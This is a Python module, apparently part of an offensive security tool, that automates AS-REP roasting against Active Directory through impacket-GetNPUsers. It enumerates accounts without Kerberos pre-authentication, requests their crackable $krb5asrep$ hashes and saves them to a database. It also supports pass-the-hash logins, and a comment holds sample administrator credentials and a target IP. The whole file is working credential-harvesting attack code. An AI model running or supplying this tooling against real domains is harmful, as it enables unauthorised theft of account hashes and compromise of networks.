from datetime import datetime, timezone
import subprocess

from ..db.database import upsert_user_hash
# run_kerberoast('gikyon.local', 'Administrator', 'Admin@123', '192.168.80.132')
# app/utils/


def _command_output(output):
    return "\n".join(
        part.strip()
        for part in (output.stdout, output.stderr)
        if part and part.strip()
    )


def _failure_message(output, default):
    combined = _command_output(output)
    if not combined:
        return default

    lines = [line.strip() for line in combined.splitlines() if line.strip()]
    useful_lines = [
        line for line in lines
        if not line.startswith("Impacket v") and "Copyright" not in line
    ]
    return "\n".join(useful_lines[-5:]) or default


def _base_command(domain, username, password, target_ip, *, ntlm_hash=None):
    command = ["impacket-GetNPUsers", "-dc-ip", target_ip]
    if ntlm_hash:
        command += ["-hashes", f":{ntlm_hash}"]
        creds = f"{domain}/{username}"
    else:
        creds = f"{domain}/{username}:{password}"
    return command, creds


def check_asreproast(domain, username, password, target_ip, *, ntlm_hash=None):
    command, creds = _base_command(domain, username, password, target_ip, ntlm_hash=ntlm_hash)
    command.append(creds)

    output = subprocess.run(
        command,
        capture_output=True,
        text=True
    )
    if output.returncode != 0:
        return [f"AS-REP check failed: {_failure_message(output, 'verify target reachability and credentials.')}"]

    formatted = []
    for line in output.stdout.splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("Impacket v") or stripped.startswith("Name ") or set(stripped) == {"-"}:
            continue
        information = line.split()
        if len(information) > 3:
            formatted.append(f"{information[1]} - {information[0]}")
    return formatted or ["No AS-REP roastable users found."]


def run_asreproast(domain, username, password, target_ip, *, ntlm_hash=None):
    command, creds = _base_command(domain, username, password, target_ip, ntlm_hash=ntlm_hash)
    command += ["-request", creds]

    output = subprocess.run(
        command,
        capture_output=True,
        text=True
    )
    if output.returncode != 0:
        return [f"AS-REP roasting failed: {_failure_message(output, 'verify target reachability and credentials.')}"]

    result = []

    for line in _command_output(output).splitlines():
        if "$krb5asrep$" in line:
            parsed = _parse_asreproast_hash(line)
            if parsed:
                timestamp = datetime.now(timezone.utc).isoformat()
                upsert_user_hash(parsed["username"], "asrepHash", parsed["hash"], timestamp)
                parsed["timestamp"] = timestamp
                result.append(parsed)
            else:
                result.append({
                    "username": "Unknown",
                    "hash": line,
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                })
    
    return result or ["AS-REP roasting completed, but no AS-REP hashes were returned."]


def _parse_asreproast_hash(hash_line):
    parts = hash_line.split("$")
    if len(parts) < 4:
        return None

    user_part = parts[3]
    if "@" not in user_part:
        return None

    username = user_part.split("@", 1)[0].lstrip("*")
    if not username:
        return None

    return {"username": username, "hash": hash_line}
